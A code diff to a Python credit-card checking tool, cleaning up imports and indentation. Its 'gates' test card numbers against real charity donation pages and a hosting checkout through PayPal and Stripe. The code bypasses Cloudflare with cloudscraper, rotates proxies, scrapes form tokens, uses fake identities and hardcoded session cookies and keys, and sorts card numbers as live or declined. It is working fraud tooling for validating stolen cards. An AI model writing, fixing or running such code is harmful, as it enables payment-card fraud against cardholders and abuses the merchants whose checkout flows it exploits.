@@ -29,7 +29,8 @@ def format_proxy(proxy):
         elif len(p) == 2:
             url = f"http://{p[0]}:{p[1]}"
             return {"http": url, "https": url}
-    except: return None
+    except:
+        return None
     return None
 
 # ============================================================================
@@ -51,18 +52,15 @@ def check_paypal_science(cc, proxy=None):
             return "❌ Format Error (Use cc|mm|yy|cvv)", "ERROR"
 
         # 2. Setup session with cloudscraper (to bypass Cloudflare)
-        import cloudscraper
         session = cloudscraper.create_scraper()
         session.verify = False
 
         if proxy:
-            from .gates import format_proxy  # relative import if inside gates.py
-            proxies_dict = format_proxy(proxy)
+            proxies_dict = format_proxy(proxy)   # call local function
             if proxies_dict:
                 session.proxies.update(proxies_dict)
 
         # Generate random user data (same as script)
-        import random
         first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
         last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
         cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
@@ -89,7 +87,6 @@ def check_paypal_science(cc, proxy=None):
         r = session.get('https://atlanticcitytheatrecompany.com/donations/donate/', headers=headers, timeout=20)
 
         # Extract required tokens
-        import re, base64
         ssa = re.search(r'name="give-form-hash" value="(.*?)"', r.text).group(1)
         ssa00 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r.text).group(1)
         ss000a00 = re.search(r'name="give-form-id" value="(.*?)"', r.text).group(1)
@@ -143,7 +140,6 @@ def check_paypal_science(cc, proxy=None):
         r2 = session.post('https://atlanticcitytheatrecompany.com/wp-admin/admin-ajax.php', headers=headers_ajax, data=data, timeout=20)
 
         # 5. Second AJAX – create PayPal order (multipart)
-        from requests_toolbelt.multipart.encoder import MultipartEncoder
         multipart_data = MultipartEncoder({
             'give-honeypot': (None, ''),
             'give-form-id-prefix': (None, ssa00),
@@ -316,8 +312,8 @@ def check_paypal_science(cc, proxy=None):
                 return "Unknown Error", "ERROR"
 
     except Exception as e:
-    print(f"❌ PayPal Science error: {traceback.format_exc()}")
-    return f"Process Error: {str(e)}", "ERROR"
+        print(f"❌ PayPal Science error: {traceback.format_exc()}")
+        return f"Process Error: {str(e)}", "ERROR"
 
 # ============================================================================
 # 🚪 GATE 2: PayPal Commerce (SFTS)
@@ -400,7 +396,6 @@ def check_paypal_sfts(cc, proxy=None):
         r.post('https://sfts.org.uk/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
 
         # 5. Create Order Request
-        # Define fields first so we can reuse the dictionary, not the encoder
         fields_dict = {
             'give-honeypot': '',
             'give-form-id-prefix': id_form1,
@@ -429,10 +424,7 @@ def check_paypal_sfts(cc, proxy=None):
         }
 
         multipart_data = MultipartEncoder(fields=fields_dict)
-        
-        # Update headers with correct Content-Type for Multipart
         headers.update({'content-type': multipart_data.content_type})
-        
         params = {'action': 'give_paypal_commerce_create_order'}
         response = r.post(
             'https://sfts.org.uk/wp-admin/admin-ajax.php',
@@ -479,12 +471,8 @@ def check_paypal_sfts(cc, proxy=None):
         r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=pp_headers, json=json_data)
 
         # 7. Final Approve Order
-        # IMPORTANT: Create a NEW MultipartEncoder because the previous one is exhausted
         multipart_data_approve = MultipartEncoder(fields=fields_dict)
-        
-        # Update headers again for the new boundary
         headers.update({'content-type': multipart_data_approve.content_type})
-
         params_approve = {
             'action': 'give_paypal_commerce_approve_order',
             'order': tok,
@@ -536,12 +524,12 @@ def check_paypal_sfts(cc, proxy=None):
 
     except Exception as e:
         return f"Process Error: {str(e)}", "ERROR"
+
 # ============================================================================
 # 🚪 GATE 3: Stripe Auth (Associations)
 # 📄 Source: checker.py
 # ============================================================================
 
-# Account Pool from checker.py (ESSENTIAL FOR BYPASSING LOGIN)
 ACCOUNT_POOL = [
     {
         'name': 'Xray Xlea',
@@ -634,7 +622,6 @@ def check_stripe_associations(cc, proxy=None):
 
         time.sleep(random.uniform(2.5, 3.5))
 
-        #
         stripe_hd = {
             'authority': 'api.stripe.com',
             'accept': 'application/json',
@@ -644,7 +631,6 @@ def check_stripe_associations(cc, proxy=None):
             'user-agent': ULTRA_HEADERS['user-agent'],
         }
 
-        #
         stripe_payload = (
             f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}'
             f'&billing_details[name]={acc["name"].replace(" ", "+")}'
@@ -712,36 +698,32 @@ def check_stripe_hostarmada(cc, proxy=None):
         session = requests.Session()
         session.proxies = format_proxy(proxy)
         
-        # Cookies from $tripeauth.py
         cookies = {
-    'WHMCSy551iLvnhYt7': '8ca8a4c665c9ec28eab1f8221ad4101d',
-    '_fbp': 'fb.1.1769757795735.772366065144413707',
-    '__zlcmid': '1VroFkzAJVG59We',
-    '__stripe_mid': '5330d896-1e8d-4606-a930-c28209c4f3e148b5e0',
-    '__stripe_sid': '8fc0309c-0967-4bc6-b6ad-962a97b2ff618f802f',
-    'ph_phc_V4kxp7RWacpQcqkBu4PN1BicIOKeaoGNi9dRyIo0IEm_posthog': '%7B%22%24device_id%22%3A%22019c0dc8-e4b9-7bdc-9a0e-9c1e067e64c5%22%2C%22distinct_id%22%3A%22019c0dc8-e4b9-7bdc-9a0e-9c1e067e64c5%22%2C%22%24sesid%22%3A%5B1769758005700%2C%22019c0dc8-e4d0-74c1-b7c1-be1502450835%22%2C1769757795531%5D%2C%22%24initial_person_info%22%3A%7B%22r%22%3A%22%24direct%22%2C%22u%22%3A%22https%3A%2F%2Fmy.hostarmada.com%2Fclientarea.php%22%7D%7D',
-}
+            'WHMCSy551iLvnhYt7': '8ca8a4c665c9ec28eab1f8221ad4101d',
+            '_fbp': 'fb.1.1769757795735.772366065144413707',
+            '__zlcmid': '1VroFkzAJVG59We',
+            '__stripe_mid': '5330d896-1e8d-4606-a930-c28209c4f3e148b5e0',
+            '__stripe_sid': '8fc0309c-0967-4bc6-b6ad-962a97b2ff618f802f',
+            'ph_phc_V4kxp7RWacpQcqkBu4PN1BicIOKeaoGNi9dRyIo0IEm_posthog': '%7B%22%24device_id%22%3A%22019c0dc8-e4b9-7bdc-9a0e-9c1e067e64c5%22%2C%22distinct_id%22%3A%22019c0dc8-e4b9-7bdc-9a0e-9c1e067e64c5%22%2C%22%24sesid%22%3A%5B1769758005700%2C%22019c0dc8-e4d0-74c1-b7c1-be1502450835%22%2C1769757795531%5D%2C%22%24initial_person_info%22%3A%7B%22r%22%3A%22%24direct%22%2C%22u%22%3A%22https%3A%2F%2Fmy.hostarmada.com%2Fclientarea.php%22%7D%7D',
+        }
 
-        
-        # Headers from $tripeauth.py
         headers = {
-    'authority': 'api.stripe.com',
-    'accept': 'application/json',
-    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://js.stripe.com',
-    'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-}
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        }
 
         # 2. Create Payment Method (Stripe API)
-        # Using hardcoded PK and specific GUID/MUID from file
         data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=b7547fec-aaeb-43cf-86ac-2d11a91f66ed6e4605&muid=5330d896-1e8d-4606-a930-c28209c4f3e148b5e0&sid=8fc0309c-0967-4bc6-b6ad-962a97b2ff618f802f&pasted_fields=number&payment_user_agent=stripe.js%2Fa10732936b%3B+stripe-js-v3%2Fa10732936b%3B+split-card-element&referrer=https%3A%2F%2Fmy.hostarmada.com&time_on_page=31195&key=pk_live_sZwZsvPzNPvgqldQYmY5QWhE00B8Wlf3Tx'
         
         r1 = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=15)
@@ -753,50 +735,48 @@ def check_stripe_hostarmada(cc, proxy=None):
 
         # 3. HostArmada Checkout
         headers2 = {
-        'authority': 'my.hostarmada.com',
-        'accept': 'application/json, text/javascript, */*; q=0.01',
-        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'origin': 'https://my.hostarmada.com',
-        'referer': 'https://my.hostarmada.com/cart.php?a=checkout',
-        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-        # Randomize User Info
-        rnd = random.randint(1000,9999)
+            'authority': 'my.hostarmada.com',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin': 'https://my.hostarmada.com',
+            'referer': 'https://my.hostarmada.com/cart.php?a=checkout',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+            'x-requested-with': 'XMLHttpRequest',
+        }
         data2 = {
-        'token': '5657f42085350cb956addb77da8cea663100c2ab',
-        'submit': 'true',
-        'custtype': 'new',
-        'loginemail': '',
-        'loginpassword': '',
-        'firstname': 'Tommy',
-        'lastname': 'K2itm',
-        'email': 'Tommy@gmail.com',
-        'phonenumber': '315401313',
-        'password': 'Pedro1234',
-        'password2': 'Pedro1234',
-        'country': 'US',
-        'state': 'New York',
-        'address1': '402 California Avenue',
-        'address2': 'suite 2910',
-        'city': 'Bakersfield',
-        'companyname': 'Enzo',
-        'postcode': '10080',
-        'paymentmethod': 'stripe',
-        'accordion-2': 'on',
-        'ccinfo': 'new',
-        'validatepromo': '0',
-        'promocode': '',
-        'accepttos': 'on',
-        'payment_method_id': id,
-    }
+            'token': '5657f42085350cb956addb77da8cea663100c2ab',
+            'submit': 'true',
+            'custtype': 'new',
+            'loginemail': '',
+            'loginpassword': '',
+            'firstname': 'Tommy',
+            'lastname': 'K2itm',
+            'email': 'Tommy@gmail.com',
+            'phonenumber': '315401313',
+            'password': 'Pedro1234',
+            'password2': 'Pedro1234',
+            'country': 'US',
+            'state': 'New York',
+            'address1': '402 California Avenue',
+            'address2': 'suite 2910',
+            'city': 'Bakersfield',
+            'companyname': 'Enzo',
+            'postcode': '10080',
+            'paymentmethod': 'stripe',
+            'accordion-2': 'on',
+            'ccinfo': 'new',
+            'validatepromo': '0',
+            'promocode': '',
+            'accepttos': 'on',
+            'payment_method_id': id_tok,   # fixed variable name
+        }
 
         r2 = session.post('https://my.hostarmada.com/index.php?rp=/stripe/payment/intent', 
                           cookies=cookies, headers=headers2, data=data2, timeout=30)
@@ -805,10 +785,10 @@ def check_stripe_hostarmada(cc, proxy=None):
         
         # 4. Result Logic from $tripeauth.py
         if 'warning' in result:
-             warning = result['warning']
-             if "Insufficient" in warning: return "Insufficient Funds", "APPROVED"
-             if "security code" in warning: return "CCN Live (Security Code)", "APPROVED"
-             return f"Declined ({warning})", "DECLINED"
+            warning = result['warning']
+            if "Insufficient" in warning: return "Insufficient Funds", "APPROVED"
+            if "security code" in warning: return "CCN Live (Security Code)", "APPROVED"
+            return f"Declined ({warning})", "DECLINED"
         
         if 'success' in str(result):
             return "Approved (Auth)", "APPROVED"
